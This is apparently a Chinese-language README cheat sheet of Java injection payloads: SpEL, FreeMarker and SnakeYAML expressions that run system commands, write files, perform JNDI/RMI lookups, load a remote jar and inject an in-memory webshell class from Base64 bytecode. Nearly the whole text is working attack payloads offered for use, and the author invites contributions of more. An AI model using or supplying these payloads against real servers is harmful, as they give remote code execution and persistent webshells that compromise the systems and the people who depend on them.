# Memoryshell-JavaALL
我不允许你还不会用JAVA 内存马

## SPEL 

不加模板解析的payload
T(java.lang.Runtime).getRuntime().exec("calc")
new+java.lang.ProcessBuilder("cmd","/c","Calc").start()
加模板解析的payload
#{new java.lang.ProcessBuilder({'calc'}).start()}
可以回显时使用
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
可以打入内存马高版本Spring Core 受限
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
使用JNDI 注入利用 在Springboot 中不适用，因为它会程序启动时初始化InitialContext
#{T(java.lang.System).setProperty('com.sun.jndi.ldap.object.trustURLCodebase', 'true')} 
#{new javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"), new java.util.Hashtable()).connect()}

## FreeMarker 
执行命令
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("Calc")}
<#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}
写文件
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/hh.txt").append("<>").close()}
读文件
${"freemarker.template.utility.ObjectConstructor"?new()(java.io.FileWriter("/tmp/hh.txt").append("ttt").close())}
使用SPEL利用
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(java.lang.Runtime).getRuntime().exec(\"calc\")").getValue()}
使用SPEL 进行JNDI
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("new+javax.management.remote.rmi.RMIConnector(new+javax.management.remote.JMXServiceURL(\"service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc\"),new+java.util.Hashtable()).connect()").getValue()}
使用SPEL 加载内存马
${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('SpringInterceptor',T(org.springframework.util.Base64Utils).decodeFromString(\"yv66vgAAADQA5。。。\"),new+javax.management.loading.MLet(new+java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()").getValue()}
使用Jython 
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>

## YAML
ftp 可以换为HTTP 及其他支持协议
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["ftp://127.0.0.1:8000/yaml-payload4.jar"]]]]


各位师傅有建议及其他Payload 带带弟弟啊
未完待续.....
